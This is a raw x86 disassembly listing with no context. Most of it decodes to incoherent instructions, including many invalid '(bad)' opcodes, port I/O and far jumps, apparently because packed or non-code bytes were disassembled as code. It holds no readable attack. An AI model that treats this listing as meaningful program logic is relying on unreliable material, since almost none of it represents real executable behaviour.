  419f89:	mov    esi,0x63b01b85
  419f8e:	les    ebx,FWORD PTR [ebp-0x6d]
  419f91:	data16 into 
  419f93:	ds mov ebp,0x79d1eb72
  419f99:	repnz scas al,BYTE PTR es:[edi]
  419f9b:	add    BYTE PTR [edx],ch
  419f9d:	mul    DWORD PTR [edx]
  419f9f:	inc    edx
  419fa0:	adc    al,0x53
  419fa2:	cmp    al,0xcf
  419fa4:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  419fa6:	stos   DWORD PTR es:[edi],eax
  419fa7:	repnz add eax,0x402257cc
  419fad:	pop    esi
  419fae:	daa    
  419faf:	sbb    BYTE PTR [esi],al
  419fb1:	fcomp  st(1)
  419fb3:	je     0x419f37
  419fb5:	es retf 0xc67d
  419fb9:	or     ecx,DWORD PTR [edx]
  419fbb:	inc    esp
  419fbc:	fnstenv [edi-0xefdf884]
  419fc2:	xchg   ebp,eax
  419fc3:	(bad)  
  419fc5:	or     al,0x3f
  419fc7:	xchg   edi,eax
  419fc8:	or     DWORD PTR [esp+eax*2-0x6f],0xa58990f5
  419fd0:	and    DWORD PTR [ecx],esp
  419fd2:	in     al,dx
  419fd3:	sub    DWORD PTR [eax+0x1cc40225],0x4f
  419fda:	fadd   st,st(4)
  419fdc:	xchg   ebp,eax
  419fdd:	cmp    eax,0xf78c1ef9
  419fe2:	add    DWORD PTR [edi+0x0],0xffffffb8
  419fe6:	sti    
  419fe7:	stc    
  419fe8:	mov    ah,cl
  419fea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419feb:	aam    0x76
  419fed:	mov    cl,0x9e
  419fef:	push   es
  419ff0:	gs or  eax,0xce2b6dc
  419ff6:	push   edi
  419ff7:	xor    eax,0xcec929d3
  419ffc:	jp     0x419fec
  419ffe:	xlat   BYTE PTR ds:[ebx]
  419fff:	sbb    esp,DWORD PTR [eax+0x63b0c62b]
  41a005:	and    cl,0xb5
  41a008:	scas   al,BYTE PTR es:[edi]
  41a009:	xor    al,0xa5
  41a00b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a00c:	loopne 0x419ff5
  41a00e:	fisub  DWORD PTR [ecx+0x33]
  41a011:	sbb    BYTE PTR [edi-0x13a0f16e],cl
  41a017:	inc    edi
  41a018:	cmp    eax,0x756ec354
  41a01d:	inc    ebx
  41a01e:	xor    BYTE PTR [ecx+edi*1-0x37],bl
  41a022:	xchg   ebx,eax
  41a023:	jmp    0x934be0e7
  41a028:	aaa    
  41a029:	pop    esi
  41a02a:	xchg   edx,eax
  41a02b:	adc    dl,bl
  41a02d:	adc    BYTE PTR [esi],ah
  41a02f:	mov    WORD PTR [eax+0xbdbae5],es
  41a035:	int    0x21
  41a037:	mov    edi,0x43d8e655
  41a03c:	(bad)  
  41a03d:	std    
  41a03e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a03f:	mov    ch,0xf2
  41a041:	test   DWORD PTR [ebx-0x9c8dd2],edx
  41a047:	arpl   WORD PTR [esi],bp
  41a049:	xor    BYTE PTR [ebp+0x1],ch
  41a04c:	xor    al,0x66
  41a04e:	call   0x5828:0xb47a4631
  41a055:	jo     0x41a053
  41a057:	retf   0x1656
  41a05a:	gs cld 
  41a05c:	leave  
  41a05d:	call   0xb64afd59
  41a062:	jae    0x41a0d0
  41a064:	into   
  41a065:	imul   esp,eax,0x18
  41a068:	push   ebp
  41a069:	xchg   BYTE PTR fs:0x9dc9a5e8,bl
  41a070:	jno    0x41a008
  41a072:	mov    al,ds:0x6e7a6f8c
  41a077:	rol    BYTE PTR [eax-0x44],cl
  41a07a:	(bad)  
  41a07b:	out    dx,eax
  41a07c:	lods   eax,DWORD PTR ds:[esi]
  41a07d:	dec    ecx
  41a07e:	test   BYTE PTR ds:0x889e80d3,dh
  41a084:	clc    
  41a085:	repz dec esi
  41a087:	xchg   esp,eax
  41a088:	pop    DWORD PTR [ebp-0x60f0491b]
  41a08e:	faddp  st(3),st
  41a090:	call   0x4f47afac
  41a095:	stos   DWORD PTR es:[edi],eax
  41a096:	out    0x80,eax
  41a098:	lods   eax,DWORD PTR ds:[esi]
  41a099:	sahf   
  41a09a:	mov    esp,0xca22bacb
  41a09f:	adc    BYTE PTR [edi-0xf3239c1],dl
  41a0a5:	loop   0x41a0ec
  41a0a7:	data16 jecxz 0x41a07d
  41a0aa:	jb     0x41a0f7
  41a0ac:	psllq  mm1,QWORD PTR [esi+ecx*8+0x2038d802]
  41a0b4:	retf   
  41a0b5:	(bad)  
  41a0b8:	daa    
  41a0b9:	push   esp
  41a0ba:	lea    ebp,[eax+ebp*8-0x4b]
  41a0be:	in     eax,0x85
  41a0c0:	sub    bl,dh
  41a0c2:	ret    
  41a0c3:	inc    edi
  41a0c4:	push   edx
  41a0c5:	inc    ebx
  41a0c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0c7:	icebp  
  41a0c8:	das    
  41a0c9:	inc    ebx
  41a0ca:	int    0x76
  41a0cc:	push   0xeffdf4db
  41a0d1:	push   ebp
  41a0d2:	ret    
  41a0d3:	pop    ebp
  41a0d4:	push   0x3d
  41a0d6:	adc    ebp,DWORD PTR [ecx-0x6c348483]
  41a0dc:	call   0xbab:0xb7bd7d76
  41a0e3:	xchg   esi,eax
  41a0e4:	pop    esi
  41a0e5:	push   eax
  41a0e6:	in     eax,dx
  41a0e7:	inc    esi
  41a0e8:	in     ax,0x3e
  41a0eb:	cdq    
  41a0ec:	add    ah,0xfb
  41a0ef:	loop   0x41a153
  41a0f1:	dec    ebx
  41a0f2:	call   0x824a:0xc6ce1e1e
  41a0f9:	test   DWORD PTR [ecx],ebp
  41a0fb:	retf   
  41a0fc:	out    0x21,al
  41a0fe:	mov    WORD PTR [eax-0x57d4e3c7],?
  41a104:	and    eax,0x4b2b30d4
  41a109:	fcmovu st,st(2)
  41a10b:	jge    0x41a0a1
  41a10d:	repz js 0x41a127
  41a110:	cmc    
  41a111:	nop
  41a112:	sub    DWORD PTR [eax-0x221afe15],ebx
  41a118:	adc    BYTE PTR [ebp+0x56],al
  41a11b:	and    eax,0x96709d96
  41a120:	std    
  41a121:	xor    eax,0x9b025ef4
  41a126:	aam    0x2b
  41a128:	cmp    al,0x88
  41a12a:	pop    ds
  41a12b:	push   es
  41a12c:	ret    
  41a12d:	pop    esi
  41a12e:	mov    ah,0x63
  41a130:	xor    DWORD PTR [edi-0x54],ebx
  41a133:	aam    0x9b
  41a135:	or     BYTE PTR [ebp+0x5d],ah
  41a138:	lea    edx,[edi+ecx*2]
  41a13b:	sbb    eax,0x41990ffc
  41a140:	mov    ebp,ebp
  41a142:	xrelease mov BYTE PTR [eax+0x62],cl
  41a146:	xchg   esp,eax
  41a147:	inc    eax
  41a148:	mov    dh,0x6
  41a14a:	ror    BYTE PTR [edx+edi*2+0xfa04e00],0x20
  41a152:	ja     0x41a174
  41a154:	aaa    
  41a155:	or     eax,0x43df1946
  41a15a:	sub    DWORD PTR [edi+0x3f62be9a],esi
  41a160:	test   al,0xc3
  41a162:	(bad)  
  41a163:	stos   BYTE PTR es:[edi],al
  41a164:	ins    BYTE PTR es:[edi],dx
  41a165:	lock mov al,ds:0xb92b278e
  41a16b:	stos   DWORD PTR es:[edi],eax
  41a16c:	out    0xe3,al
  41a16e:	push   0xffffffa3
  41a170:	es loope 0x41a0fe
  41a173:	cmp    BYTE PTR [edi],dl
  41a175:	xchg   esi,eax
  41a176:	mov    ecx,0x38920115
  41a17b:	outs   dx,BYTE PTR ds:[esi]
  41a17c:	mov    ebx,0x5c8bb19f
  41a181:	cs xor bl,bh
  41a184:	stc    
  41a185:	out    dx,al
  41a186:	cli    
  41a187:	cdq    
  41a188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a189:	bound  esi,QWORD PTR [edx+ecx*1+0x440d9a5]
  41a190:	cli    
  41a191:	and    DWORD PTR [edi],esp
  41a193:	pop    edi
  41a194:	(bad)  
  41a195:	cmp    bl,BYTE PTR [ebx-0x64]
  41a198:	or     DWORD PTR [eax],edi
  41a19a:	loope  0x41a1f8
  41a19c:	outs   dx,DWORD PTR ds:[esi]
  41a19d:	in     al,dx
  41a19e:	int    0xf6
  41a1a0:	test   eax,0xad8a7389
  41a1a5:	fdivr  QWORD PTR [eax]
  41a1a7:	das    
  41a1a8:	push   ds
  41a1a9:	std    
  41a1aa:	and    bh,dh
  41a1ac:	cmp    DWORD PTR [ebx+0xd],ecx
  41a1af:	int    0x4d
  41a1b1:	lock pusha 
  41a1b3:	jmp    0x2e90:0xb1204b55
  41a1ba:	imul   BYTE PTR [eax+edx*4-0x28c41c8d]
  41a1c1:	and    al,0x94
  41a1c3:	mov    ebx,DWORD PTR [esp+edi*8+0x56]
  41a1c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1c8:	xor    DWORD PTR [ecx-0x4f00340e],ecx
  41a1ce:	and    dl,ch
  41a1d0:	mov    eax,0xe31891a1
  41a1d5:	stos   DWORD PTR es:[edi],eax
  41a1d6:	stos   BYTE PTR es:[edi],al
  41a1d7:	aaa    
  41a1d8:	(bad)  
  41a1da:	cmp    edx,ecx
  41a1dc:	mov    ecx,DWORD PTR [ebp-0xc]
  41a1df:	mov    DWORD PTR [ebp+0x8],ecx
  41a1e2:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1e5:	je     0x420e5d
  41a1eb:	jmp    0x41c5ad
  41a1f0:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1f3:	mov    edx,DWORD PTR [ebp-0x8]
  41a1f6:	jmp    0x41c583
  41a1fb:	cmp    BYTE PTR [edi-0x66],ch
  41a1fe:	ja     0x41a189
  41a200:	ja     0x41a23d
  41a202:	xchg   ebx,eax
  41a203:	xchg   esp,eax
  41a204:	sub    BYTE PTR [edi],bh
  41a206:	into   
  41a207:	fld    DWORD PTR [eax]
  41a209:	call   0xa7a:0x7d1c6e19
  41a210:	pop    edi
  41a211:	jp     0x41a28d
  41a213:	add    eax,0xed6cf93d
  41a218:	cmp    BYTE PTR [edi],bl
  41a21a:	mov    ecx,0xac852eda
  41a21f:	and    eax,0x96a4154a
  41a224:	test   DWORD PTR [eax-0x2d],0x921da349
  41a22b:	pop    ebp
  41a22c:	daa    
  41a22d:	out    dx,al
  41a22e:	sti    
  41a22f:	loop   0x41a2a3
  41a231:	pop    edi
  41a232:	pop    esp
  41a233:	paddd  mm2,mm4
  41a236:	cmp    eax,0xdc51bd3f
  41a23b:	sahf   
  41a23c:	je     0x41a1da
  41a23e:	test   eax,0x1922eec0
  41a243:	jp     0x41a27c
  41a245:	dec    esp
  41a246:	or     BYTE PTR [ebp+0x735a26cf],bh
  41a24c:	das    
  41a24d:	sbb    al,BYTE PTR [esi-0x5f]
  41a250:	cdq    
  41a251:	inc    esi
  41a252:	lahf   
  41a253:	cmp    ebp,edi
  41a255:	ins    DWORD PTR es:[edi],dx
  41a256:	cmp    ah,al
  41a258:	pop    ebp
  41a259:	add    bl,al
  41a25b:	std    
  41a25c:	cmp    eax,ebp
  41a25e:	or     BYTE PTR [eax+0x5db763c8],0x9c
  41a265:	bound  eax,QWORD PTR [edx]
  41a267:	adc    BYTE PTR [edi+ebp*4+0x3387d212],cl
  41a26e:	or     BYTE PTR [esi],al
  41a270:	stos   DWORD PTR es:[edi],eax
  41a271:	or     al,dh
  41a273:	cmp    BYTE PTR [ecx],al
  41a275:	stc    
  41a276:	pushf  
  41a277:	repz pop ebx
  41a279:	ret    0x3fc5
  41a27c:	pop    ecx
  41a27d:	sbb    ch,cl
  41a27f:	adc    BYTE PTR [ecx],0x8a
  41a282:	fwait
  41a283:	inc    esi
  41a284:	into   
  41a285:	hlt    
  41a286:	sbb    ah,ah
  41a288:	enter  0x1073,0xbb
  41a28c:	add    eax,0x100c6683
  41a291:	dec    ebx
  41a292:	pop    esi
  41a293:	(bad)  
  41a294:	fisubr WORD PTR [edx+0x2477ad21]
  41a29a:	pop    ebp
  41a29b:	sub    ah,BYTE PTR [ebp+0x5e]
  41a29e:	dec    eax
  41a29f:	or     al,0xf9
  41a2a1:	nop
  41a2a2:	mov    dh,0xd3
  41a2a4:	test   al,0x6c
  41a2a6:	dec    ebp
  41a2a7:	mov    dh,0xac
  41a2a9:	sub    ebp,ecx
  41a2ab:	jl     0x41a23e
  41a2ad:	cmp    esi,DWORD PTR [ecx-0x1152c6f7]
  41a2b3:	jle    0x41a330
  41a2b5:	pop    esi
  41a2b6:	shl    DWORD PTR [ebx-0x1272b0b1],1
  41a2bc:	jp     0x41a306
  41a2be:	(bad)  [di+0x79]
  41a2c2:	in     eax,0x23
  41a2c4:	push   es
  41a2c5:	mov    ecx,0xf8ccc034
  41a2ca:	in     al,dx
  41a2cb:	std    
  41a2cc:	pop    ecx
  41a2cd:	out    0x84,eax
  41a2cf:	jns    0x41a2e5
  41a2d1:	inc    esi
  41a2d2:	xlat   BYTE PTR ds:[ebx]
  41a2d3:	pop    DWORD PTR [edx-0x41]
  41a2d6:	adc    esi,ebp
  41a2d8:	setb   BYTE PTR [edi+0x23f14138]
  41a2df:	pop    edx
  41a2e0:	jns    0x41a2cb
  41a2e2:	inc    ebx
  41a2e3:	push   edi
  41a2e4:	xor    eax,0x9a48570
  41a2e9:	pusha  
  41a2ea:	lahf   
  41a2eb:	sub    ebp,edx
  41a2ed:	clc    
  41a2ee:	mov    edx,0x8d0bbdda
  41a2f3:	popa   
  41a2f4:	push   ds
  41a2f5:	ror    ebp,1
  41a2f7:	test   al,0xfd
  41a2f9:	fdiv   QWORD PTR [ebp-0x1d]
  41a2fc:	cli    
  41a2fd:	inc    edx
  41a2fe:	jp     0x41a35e
  41a300:	mov    dh,0x6b
  41a302:	movlps xmm5,QWORD PTR [eax+ebx*8-0x25]
  41a307:	cli    
  41a308:	mul    DWORD PTR [edx+eax*1]
  41a30b:	xor    esp,DWORD PTR [ebx-0x36d4af3e]
  41a311:	and    al,0x85
  41a313:	test   BYTE PTR [edi+0x42a903dd],dh
  41a319:	pop    ebx
  41a31a:	push   edx
  41a31b:	mov    ebp,0x6efdf02f
  41a320:	xor    DWORD PTR ds:0xf3fd5856,eax
  41a326:	std    
  41a327:	in     eax,0xc4
  41a329:	cmc    
  41a32a:	cld    
  41a32b:	sbb    bl,BYTE PTR [ebx-0x28]
  41a32e:	mov    eax,0x9a5e1ce2
  41a333:	add    dl,bh
  41a335:	lahf   
  41a336:	call   0x1af6c134
  41a33b:	sbb    DWORD PTR [edi],edi
  41a33d:	sbb    eax,0x19044078
  41a342:	jp     0x41a2f5
  41a344:	mov    ds:0x5ebdb3ce,eax
  41a349:	mov    al,0x45
  41a34b:	jge    0x41a346
  41a34d:	int3   
  41a34e:	add    ch,BYTE PTR [ebp-0x64]
  41a351:	jl     0x41a32b
  41a353:	fisubr DWORD PTR [edx]
  41a355:	pop    ss
  41a356:	inc    esp
  41a357:	pushf  
  41a358:	repz sub DWORD PTR [eax-0x7958f77b],ebp
  41a35f:	outs   dx,BYTE PTR ds:[esi]
  41a360:	ins    DWORD PTR es:[edi],dx
  41a361:	push   eax
  41a362:	jbe    0x41a328
  41a364:	sahf   
  41a365:	inc    ebx
  41a366:	cmp    BYTE PTR [edi+0x160b43b1],cl
  41a36c:	mov    ebp,0x724d7062
  41a371:	lods   al,BYTE PTR ds:[esi]
  41a372:	mov    esp,0xed84ee9d
  41a377:	and    dh,BYTE PTR [ecx]
  41a379:	pushf  
  41a37a:	cld    
  41a37b:	outs   dx,BYTE PTR ds:[esi]
  41a37c:	xor    BYTE PTR [edi-0x261cf529],bl
  41a382:	lea    esp,[edi]
  41a384:	clc    
  41a385:	dec    edx
  41a386:	fbstp  TBYTE PTR [edx+0x334b7467]
  41a38c:	aas    
  41a38d:	jg     0x41a3d4
  41a38f:	xchg   ebp,eax
  41a390:	fld    DWORD PTR [esi]
  41a392:	loopne 0x41a353
  41a394:	dec    esi
  41a395:	jecxz  0x41a3c5
  41a397:	adc    DWORD PTR [ebp+0x156bc4a9],0x6965512d
  41a3a1:	push   ebp
  41a3a2:	xchg   ebp,eax
  41a3a3:	call   0x9677:0x95c57bd
  41a3aa:	add    bh,dh
  41a3ac:	imul   edx,DWORD PTR [ebx+eax*4-0x4d],0xcf89cbc9
  41a3b4:	aad    0x9b
  41a3b6:	push   ebx
  41a3b7:	and    al,ah
  41a3b9:	jnp    0x41a378
  41a3bb:	sub    eax,0x69b7533e
  41a3c0:	sti    
  41a3c1:	jge    0x41a35e
  41a3c3:	xor    esi,ebx
  41a3c5:	repz sbb DWORD PTR [esi+eax*1+0x52],eax
  41a3ca:	pushf  
  41a3cb:	xchg   ebp,eax
  41a3cc:	mov    fs,WORD PTR [ebp+0x58]
  41a3cf:	pop    es
  41a3d0:	in     al,dx
  41a3d1:	sub    DWORD PTR [eax],ecx
  41a3d3:	or     BYTE PTR [ebp-0x29],ah
  41a3d6:	add    edx,ebx
  41a3d8:	jns    0x41a3c9
  41a3da:	push   ebp
  41a3db:	mov    esp,0x2ec079a7
  41a3e0:	push   0xfffffffd
  41a3e2:	inc    esp
  41a3e3:	mov    WORD PTR [esi-0x5f],?
  41a3e6:	stos   BYTE PTR es:[edi],al
  41a3e7:	sahf   
  41a3e8:	rcr    DWORD PTR [ebp+edi*8+0x1b],1
  41a3ec:	out    dx,eax
  41a3ed:	xlat   BYTE PTR ds:[ebx]
  41a3ee:	push   edi
  41a3ef:	mov    eax,0x735503de
  41a3f4:	inc    edi
  41a3f5:	xor    DWORD PTR [edx],esi
  41a3f7:	inc    ecx
  41a3f8:	and    BYTE PTR [edx+edi*8],dl
  41a3fb:	mov    ch,0xcb
  41a3fd:	mov    cl,0x9b
  41a3ff:	lods   eax,DWORD PTR ds:[esi]
  41a400:	mov    ebx,0xe7d7b56
  41a405:	stc    
  41a406:	push   ds
  41a407:	int    0x25
  41a409:	mov    gs,WORD PTR fs:[eax]
  41a40c:	sbb    al,0x82
  41a40e:	sub    bl,bh
  41a410:	(bad)  
  41a411:	aam    0xfb
  41a413:	clc    
  41a414:	or     DWORD PTR [ecx],edx
  41a416:	and    al,0x75
  41a418:	cld    
  41a419:	out    0x49,eax
  41a41b:	fcom   QWORD PTR [ebx]
  41a41d:	mov    edx,0xe8e934b6
  41a422:	sub    bh,BYTE PTR [edx]
  41a424:	mov    eax,0x8883c185
  41a429:	jl     0x41a3c5
  41a42b:	scas   al,BYTE PTR es:[edi]
  41a42c:	dec    edx
  41a42d:	jmp    0xaeaf19c6
  41a432:	push   eax
  41a433:	shr    esi,cl
  41a435:	mov    ch,0xcb
  41a437:	icebp  
  41a438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a439:	sbb    edi,DWORD PTR [edi-0x2d]
  41a43c:	jge    0x41a437
  41a43e:	pop    ss
  41a43f:	or     BYTE PTR [ecx+0x5a818de1],ch
  41a445:	or     BYTE PTR [ecx],cl
  41a447:	pop    ds
  41a448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a449:	push   0x8a9132f7
  41a44e:	rcl    ebx,cl
  41a450:	stos   BYTE PTR es:[edi],al
  41a451:	pop    ebx
  41a452:	jmp    0xedfd:0x9826fdaf
  41a459:	popa   
  41a45a:	popf   
  41a45b:	pcmpgtb mm2,QWORD PTR [esi]
  41a45e:	jl     0x41a436
  41a460:	icebp  
  41a461:	inc    esp
  41a462:	sub    cl,BYTE PTR [esi]
  41a464:	jbe    0x41a451
  41a466:	ss mov ebp,0x495a7235
  41a46c:	into   
  41a46d:	xor    ecx,DWORD PTR [esp+ebp*1-0x74]
  41a471:	fidiv  DWORD PTR [edi+eax*8]
  41a474:	test   al,0x77
  41a476:	xchg   edi,eax
  41a477:	sti    
  41a478:	sbb    al,dh
  41a47a:	repnz mov eax,ds:0x16c4b4a3
  41a480:	addr16 pop ecx
  41a482:	push   edx
  41a483:	fistp  WORD PTR ds:0xc23b0756
  41a489:	dec    edi
  41a48a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a48b:	shr    DWORD PTR [eax+0x73],0xa7
  41a48f:	push   edi
  41a490:	ds hlt 
  41a492:	int3   
  41a493:	shl    DWORD PTR [esi+0x15],cl
  41a496:	aad    0x2f
  41a498:	and    DWORD PTR [ecx+0x5b],esp
  41a49b:	clc    
  41a49c:	pop    eax
  41a49d:	cmp    esi,eax
  41a49f:	out    dx,al
  41a4a0:	sahf   
  41a4a1:	cli    
  41a4a2:	cmc    
  41a4a3:	fild   DWORD PTR [eax]
  41a4a5:	loop   0x41a4bc
  41a4a7:	(bad)  
  41a4a9:	nop
  41a4aa:	xor    dh,al
  41a4ac:	and    BYTE PTR [ebp+0xb],0xc0
  41a4b0:	sub    eax,0xe133909f
  41a4b5:	push   edx
  41a4b6:	sub    edi,ebp
  41a4b8:	imul   esp,DWORD PTR [eax+edx*1],0x82b78e83
  41a4bf:	and    BYTE PTR [edi],dl
  41a4c1:	(bad)  
  41a4c3:	mov    ss,WORD PTR [edx-0x4a]
  41a4c6:	in     al,dx
  41a4c7:	(bad)  
  41a4c8:	push   0xffffffaa
  41a4ca:	pop    eax
  41a4cb:	mov    ch,0x6b
  41a4cd:	inc    esp
  41a4ce:	jle    0x41a505
  41a4d0:	(bad)  
  41a4d1:	sub    eax,0xcdc9705
  41a4d6:	mov    dl,0x9c
  41a4d8:	cmp    ebx,esi
  41a4da:	push   ss
  41a4db:	or     eax,0xdb545d96
  41a4e0:	test   DWORD PTR [ebx],ebx
  41a4e2:	jmp    0xf5844c7c
  41a4e7:	dec    edx
  41a4e8:	call   0x2e3e:0x56d0dc73
  41a4ef:	cs adc al,0xee
  41a4f2:	sbb    dl,BYTE PTR [eax]
  41a4f4:	sbb    dh,BYTE PTR [eax]
  41a4f6:	les    esp,FWORD PTR ds:0x94e34684
  41a4fc:	(bad)  
  41a4fd:	cli    
  41a4fe:	dec    ecx
  41a4ff:	iret   
  41a500:	pop    eax
  41a501:	pushf  
  41a502:	sbb    ebp,DWORD PTR [ecx]
  41a504:	push   ebx
  41a505:	mov    bl,0xc8
  41a507:	jae    0x41a4c4
  41a509:	and    DWORD PTR [ecx],ebx
  41a50b:	inc    edi
  41a50c:	mov    BYTE PTR [esi],bh
  41a50e:	mov    WORD PTR [esi-0x6f034263],?
  41a514:	or     eax,0xaf11ad7
  41a519:	xor    ch,BYTE PTR [ecx+ebx*4+0x24]
  41a51d:	popf   
  41a51e:	popa   
  41a51f:	cdq    
  41a520:	pop    esp
  41a521:	adc    BYTE PTR [eax+eiz*1-0x10],dl
  41a525:	fwait
  41a526:	addr16 sub al,0x5d
  41a529:	dec    ebp
  41a52a:	das    
  41a52b:	cmp    DWORD PTR [ecx],edx
  41a52d:	enter  0x4145,0xf5
  41a531:	(bad)  [esi+0x70]
  41a534:	or     dl,BYTE PTR [esi+eiz*4-0x68]
  41a538:	fyl2xp1 
  41a53a:	push   cs
  41a53b:	(bad)  
  41a53c:	test   al,0x47
  41a53e:	cli    
  41a53f:	add    bh,BYTE PTR [edx+ebx*2]
  41a542:	push   0xffffffa4
  41a544:	in     eax,0xac
  41a546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a547:	in     al,0x98
  41a549:	pop    esp
  41a54a:	push   0x55
  41a54c:	or     eax,0xca29cdcc
  41a551:	push   es
  41a552:	ror    DWORD PTR [esi],1
  41a554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a555:	xchg   edx,eax
  41a556:	xor    eax,0xc02ce0ab
  41a55b:	pop    esp
  41a55c:	adc    eax,0x84ef3b6f
  41a561:	fs sbb al,0x81
  41a564:	fcom   DWORD PTR [edi]
  41a566:	xchg   edi,eax
  41a567:	bound  esp,QWORD PTR [ebp+edx*4+0x491743f8]
  41a56e:	ret    0x5aa5
  41a571:	pop    esi
  41a572:	adc    ebx,edi
  41a574:	test   eax,0xb00995e4
  41a579:	sbb    ebp,edi
  41a57b:	mov    eax,ds:0x1d50a25a
  41a580:	std    
  41a581:	inc    ebx
  41a582:	mov    ds:0xf435ba60,al
  41a587:	fbstp  TBYTE PTR [eax+ecx*4]
  41a58a:	jp     0x41a584
  41a58c:	mov    ch,0xd9
  41a58e:	imul   ebp,ebx,0xaca33bed
  41a594:	xor    BYTE PTR [ecx+ebx*4-0x29a7647a],dl
  41a59b:	js     0x41a549
  41a59d:	in     al,dx
  41a59e:	popa   
  41a59f:	icebp  
  41a5a0:	xor    al,BYTE PTR [ebx-0x15]
  41a5a3:	cmc    
  41a5a4:	inc    esp
  41a5a5:	ins    BYTE PTR es:[edi],dx
  41a5a6:	sbb    ecx,esp
  41a5a8:	pop    ss
  41a5a9:	pop    eax
  41a5aa:	dec    esp
  41a5ab:	sbb    DWORD PTR [ebp+edx*1-0x2e54cc4],0xffffffae
  41a5b3:	inc    esi
  41a5b4:	inc    edx
  41a5b5:	xor    BYTE PTR [ecx+0xa34c9c3],dl
  41a5bb:	mov    ebx,0x940916c1
  41a5c0:	sbb    BYTE PTR [esi+0x4b],ah
  41a5c3:	jle    0x41a62a
  41a5c5:	xchg   ebp,eax
  41a5c6:	js     0x41a5f5
  41a5c8:	hlt    
  41a5c9:	mov    ebx,DWORD PTR [ebx+0x21bc091a]
  41a5cf:	sbb    dh,al
  41a5d1:	add    BYTE PTR [esi+0x1e],ah
  41a5d4:	jp     0x41a5d5
  41a5d6:	mov    bl,0x92
  41a5d8:	std    
  41a5d9:	xchg   BYTE PTR [edi+ecx*2+0x44],ch
  41a5dd:	xchg   ecx,eax
  41a5de:	mov    edx,0x6af2953
  41a5e3:	fist   WORD PTR [ebx-0x49a415]
  41a5e9:	das    
  41a5ea:	mov    edx,0x718f1ef9
  41a5ef:	lds    edx,FWORD PTR [bx-0x1f16]
  41a5f4:	fld    DWORD PTR [esi-0x28]
  41a5f7:	or     eax,0xea8359e5
  41a5fc:	aas    
  41a5fd:	inc    eax
  41a5fe:	push   ebp
  41a5ff:	jbe    0x41a589
  41a601:	xor    edi,ebx
  41a603:	sub    eax,0x1d743c0b
  41a608:	out    0x96,eax
  41a60a:	push   ds
  41a60b:	(bad)  
  41a60d:	push   esi
  41a60e:	data16 test dl,dh
  41a611:	mov    edx,0xbcd91120
  41a616:	addr16 jno 0x41a678
  41a619:	or     dl,ah
  41a61b:	outs   dx,BYTE PTR ds:[esi]
  41a61c:	mov    dl,0x39
  41a61e:	ret    0xb462
  41a621:	push   esi
  41a622:	and    ch,dl
  41a624:	jmp    0x27c4145c
  41a629:	imul   BYTE PTR [eax+0x7a]
  41a62c:	add    al,0x75
  41a62e:	fs sbb al,0xdf
  41a631:	cdq    
  41a632:	jbe    0x41a674
  41a634:	jmp    0x41a5b6
  41a636:	shr    DWORD PTR [ebx-0x5f],cl
  41a639:	test   DWORD PTR [esi],eax
  41a63b:	jbe    0x41a662
  41a63d:	in     eax,dx
  41a63e:	jl     0x41a689
  41a640:	mov    cl,0xbc
  41a642:	lock ficomp WORD PTR gs:[edx-0x3e]
  41a647:	dec    ebp
  41a648:	dec    eax
  41a649:	gs add al,0xd9
  41a64c:	pop    ecx
  41a64d:	popa   
  41a64e:	push   ds
  41a64f:	or     esi,esi
  41a651:	xor    BYTE PTR [eax-0x5bd5c3f6],dl
  41a657:	jae    0x41a692
  41a659:	xor    ax,0xa33b
  41a65d:	cdq    
  41a65e:	imul   ebx,DWORD PTR [eax],0x35
  41a661:	jge    0x41a662
  41a663:	jae    0x41a68f
  41a665:	add    al,0xbf
  41a667:	(bad)  
  41a668:	jmp    0x41a675
  41a66a:	popf   
  41a66b:	gs xchg esp,eax
  41a66d:	sbb    ah,BYTE PTR [edx+0x55]
  41a670:	js     0x41a658
  41a672:	xlat   BYTE PTR ds:[ebx]
  41a673:	aas    
  41a674:	inc    esi
  41a675:	ja     0x41a64c
  41a677:	dec    BYTE PTR ds:0x83bc5e44
  41a67d:	adc    DWORD PTR [ecx+0x4a],edi
  41a680:	adc    bh,BYTE PTR [esi+0x5b93515b]
  41a686:	shl    DWORD PTR [esi+0x7],1
  41a689:	jb     0x41a693
  41a68b:	lea    ecx,[esi+0x61]
  41a68e:	sahf   
  41a68f:	lods   eax,DWORD PTR ds:[esi]
  41a690:	sbb    bh,BYTE PTR [edi+0x12]
  41a693:	ret    0xc635
  41a696:	mov    BYTE PTR [eax+0x3c],dl
  41a699:	scas   al,BYTE PTR es:[edi]
  41a69a:	xor    al,0x5e
  41a69c:	lods   al,BYTE PTR ds:[esi]
  41a69d:	mov    DWORD PTR [edx-0x69],esp
  41a6a0:	push   eax
  41a6a1:	(bad)  
  41a6a2:	inc    edx
  41a6a3:	imul   esp,edi,0x18
  41a6a6:	add    dl,BYTE PTR [ebx-0x6bb3add0]
  41a6ac:	push   ebx
  41a6ad:	sbb    DWORD PTR [ecx-0x73],esi
  41a6b0:	sbb    bl,bl
  41a6b2:	pop    edi
  41a6b3:	jecxz  0x41a66e
  41a6b5:	xchg   ebx,eax
  41a6b6:	push   ebx
  41a6b7:	xlat   BYTE PTR ds:[ebx]
  41a6b8:	in     al,dx
  41a6b9:	in     al,0xc4
  41a6bb:	(bad)  
  41a6bc:	test   DWORD PTR fs:[ecx-0x594f48a],ecx
  41a6c3:	mov    ds:0xcbb3ba64,eax
  41a6c8:	aaa    
  41a6c9:	rcl    BYTE PTR [ecx-0x7b38f7b4],0x38
  41a6d0:	popa   
  41a6d1:	iret   
  41a6d2:	dec    ebp
  41a6d3:	int    0xa7
  41a6d5:	ins    BYTE PTR es:[edi],dx
  41a6d6:	scas   eax,DWORD PTR es:[edi]
  41a6d7:	(bad)  
  41a6d9:	mov    esp,0x68443f3
  41a6de:	stos   DWORD PTR es:[edi],eax
  41a6df:	sti    
  41a6e0:	popf   
